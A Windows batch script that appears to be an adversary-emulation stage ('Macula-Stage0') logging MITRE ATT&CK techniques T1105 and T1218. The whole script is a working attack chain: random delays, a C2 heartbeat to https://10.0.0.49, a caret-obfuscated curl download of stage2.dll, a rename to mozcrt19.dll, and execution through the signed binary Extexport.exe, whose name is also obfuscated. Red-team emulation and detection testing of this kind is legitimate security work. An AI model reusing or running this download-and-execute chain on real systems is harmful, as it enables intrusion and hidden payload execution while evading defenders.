@echo off
SETLOCAL ENABLEDELAYEDEXPANSION

REM Random constant names with PHR_ as values
SET yktnwwf=%APPDATA%\8465\be9aea8e
SET fpakbq=Macula-Stage0-8465
SET repbmqg=https://10.0.0.49
SET rdzgrnne=https://10.0.0.49/stage/2/icon.png?8465-7
SET omxgazu=BALAM-S2BO
SET yydue=7
SET edjwtl=project.txt
SET fpldhe=8465

REM Log and temp paths using random names
SET uwefn=%APPDATA%\!yydue!
SET lyxcm=!uwefn!\macula-simulations.log

REM Agent name variable for logging
SET agentvar=!omxgazu!

echo [%DATE% %TIME%][DEBUG][!agentvar!]: script_start=initializing>> "!lyxcm!" 2>nul

REM Initial random delay before any operations
SET /A zdoyn=%RANDOM% %% 30 + 30
echo [%DATE% %TIME%][DEBUG][!agentvar!]: initial_delay=!zdoyn!s>> "!lyxcm!" 2>nul
timeout /t !zdoyn! /nobreak >nul

REM --- C2 HEARTBEAT (FIRST TASK) ---
echo [%DATE% %TIME%][DEBUG][!agentvar!]: heartbeat_start=checking_in>> "!lyxcm!" 2>nul
curl -k -s -o nul "!rdzgrnne!"
IF !ERRORLEVEL! EQU 0 (
    SET hkqrs=1
    SET jvnoe=
) ELSE (
    SET hkqrs=0
    SET jvnoe=connection_failed
)
echo [%DATE% %TIME%][!agentvar!]: !yydue!-!fpldhe!-T1105|Ingress Tool Transfer=!hkqrs!:!jvnoe!>> "!lyxcm!" 2>nul
echo [%DATE% %TIME%][DEBUG][!agentvar!]: heartbeat_result=!hkqrs!>> "!lyxcm!" 2>nul

ping -n 8 127.0.0.1 >nul

REM --- DOWNLOAD DLL ---
SET rkwynp=!repbmqg!/stage2.dll?sid=!fpldhe!
SET txmve=!uwefn!\temp.tmp

echo [%DATE% %TIME%][DEBUG][!agentvar!]: download_start=!rkwynp!>> "!lyxcm!" 2>nul

REM Obfuscated curl command with caret escapes
SET dn1=c^u
SET dn2=r^l
SET dn3= -^k
SET dn4= -s
SET dn5= -o

!dn1!!dn2!!dn3!!dn4!!dn5! "!txmve!" "!rkwynp!"
IF !ERRORLEVEL! EQU 0 (
    SET wjrnt=1
    SET ciyph=
) ELSE (
    SET wjrnt=0
    SET ciyph=download_failed
)
echo [%DATE% %TIME%][!agentvar!]: !yydue!-!fpldhe!-T1105|Ingress Tool Transfer=!wjrnt!:!ciyph!>> "!lyxcm!" 2>nul
echo [%DATE% %TIME%][DEBUG][!agentvar!]: download_complete=!wjrnt!>> "!lyxcm!" 2>nul

CHOICE /C Y /N /D Y /T 12 >nul

REM --- RENAME FILE ---
SET ztqd=!uwefn!\mozcrt19.dll
IF EXIST "!txmve!" (
    MOVE /Y "!txmve!" "!ztqd!" >nul
    echo [%DATE% %TIME%][DEBUG][!agentvar!]: rename_operation=!ztqd!>> "!lyxcm!" 2>nul
) ELSE (
    echo [%DATE% %TIME%][DEBUG][!agentvar!]: rename_operation=source_missing>> "!lyxcm!" 2>nul
)

REM Random middle delay
SET /A gwofr=%RANDOM% %% 15 + 5
echo [%DATE% %TIME%][DEBUG][!agentvar!]: random_delay=!gwofr!s>> "!lyxcm!" 2>nul
timeout /t !gwofr! /nobreak >nul

REM --- EXECUTE LOLBIN ---
REM Change to temp directory
PUSHD "!uwefn!" >nul
echo [%DATE% %TIME%][DEBUG][!agentvar!]: directory_change=!uwefn!>> "!lyxcm!" 2>nul

REM Obfuscated Extexport.exe with heavy caret escapes
SET ex1=E^xt^e
SET ex2=x^p^o
SET ex3=r^t^.^e
SET ex4=x^e
SET lolbin=!ex1!!ex2!!ex3!!ex4!

IF EXIST "!ztqd!" (
    echo [%DATE% %TIME%][DEBUG][!agentvar!]: process_start=!lolbin!>> "!lyxcm!" 2>nul
    !lolbin! "!uwefn!" foo bar
    IF !ERRORLEVEL! EQU 0 (
        SET ypkgm=1
        SET khdbf=
    ) ELSE (
        SET ypkgm=0
        SET khdbf=execution_error
    )
) ELSE (
    SET ypkgm=0
    SET khdbf=file_missing
)
echo [%DATE% %TIME%][!agentvar!]: !yydue!-!fpldhe!-T1218|Signed Binary Proxy Execution=!ypkgm!:!khdbf!>> "!lyxcm!" 2>nul
echo [%DATE% %TIME%][DEBUG][!agentvar!]: process_complete=!ypkgm!>> "!lyxcm!" 2>nul

POPD >nul

REM Final delay before exit
ping -n 6 127.0.0.1 >nul
echo [%DATE% %TIME%][DEBUG][!agentvar!]: script_end=cleanup>> "!lyxcm!" 2>nul